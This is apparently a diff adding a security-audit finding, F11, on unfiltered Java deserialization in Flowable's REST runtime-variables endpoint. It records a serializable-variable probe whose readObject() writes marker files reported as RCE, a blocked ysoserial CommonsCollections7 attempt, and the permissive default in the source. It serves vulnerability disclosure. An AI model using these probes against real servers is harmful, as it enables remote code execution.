@@ -1,0 +1,22 @@
+
+=== F11: unfiltered Java deserialization via serializable runtime variable ===
+$ POST /flowable-rest/service/runtime/process-instances/<id>/variables  (type=serializable, 30-byte probe)
+HTTP 201 {"name":"pwned","scope":"local","type":"serializable","valueUrl":".../variables/pwned/data"}
+
+--- marker file created by readObject() inside the Flowable JVM ---
+RCE at 1790926723558 jvm=17.0.20.1 user=rinne cwd=/Users/rinne/Desktop/github/flowable-engine
+RCE at 1790926723575 jvm=17.0.20.1 user=rinne cwd=/Users/rinne/Desktop/github/flowable-engine
+--- application stdout ---
+[CVE-PROBE] readObject executed -> /Users/rinne/security-audit-skill/flowable-engine/run-1/lab/flowable-deser-pwned
+[CVE-PROBE] readObject executed -> /Users/rinne/security-audit-skill/flowable-engine/run-1/lab/flowable-deser-pwned
+
+--- a real gadget chain is present on the classpath but CC is self-gated ---
+classpath: commons-collections-3.2.2.jar, commons-beanutils-1.11.0.jar, groovy-5.0.5.jar
+POST of ysoserial CommonsCollections7 => HTTP 500
+  "Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled
+   for security reasons. To enable it set system property
+   'org.apache.commons.collections.enableUnsafeSerialization' to 'true'"
+=> Flowable installs no ObjectInputFilter; the only gate is the dependency library's own opt-out switch.
+
+--- default is permissive even without the shipped property ---
+BaseExecutionVariableResource.java:70  env.getProperty("rest.variables.allow.serializable", Boolean.class, true)
